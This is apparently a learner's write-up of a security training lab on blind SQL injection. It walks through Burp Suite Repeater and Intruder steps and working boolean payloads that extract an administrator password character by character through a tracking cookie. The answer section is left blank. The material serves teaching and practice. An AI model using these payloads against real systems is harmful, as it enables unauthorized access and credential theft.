# Lab: Blind SQL injection with conditional responses

**End Goal:** You need to exploit the blind SQL injection vulnerability to find out the password of the ```administrator``` user.

**Analysis**

*The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.*

- Burp suite --> proxy tab --> Open browser --> access lab in it
- Go to a category in the browser --> Http history in proxy tab --> right click on the request and open in repeater
- Find TrackingId --> Check if a true statement recieves 'Welcome back' by adding the following before ;

' AND '1'='1

*This returned 'Welcome back' and '1'='2' didn't, which means the signal exists. According to the lab instructions, the database contains a different table called ```users```, with columns called ```username``` and ```password```. Inject payload to get the first character of password and to check if it works.*

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

*This didn't return 'Welcome back' so I tried some other random characters*

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='m

*This returned 'Welcome back'. I need to automate this now to extract the full password.*

- Right click and send to Intruder --> Positions tab --> Click Clear § to remove Burp's auto-markers --> set cookie value to the following payload

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

- Wrap the two spots in § --> highlight the 1 (the position number) and click Add § --> highlight the a (the guess) and click Add §

*This is how it looks like now*

' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§

- Set Attack type to Cluster bomb --> Payloads tab --> Position 1: Numbers: 1-20 --> Position 2: Simple List: a-z and 0-9 --> Start Attack

**Answer:** 


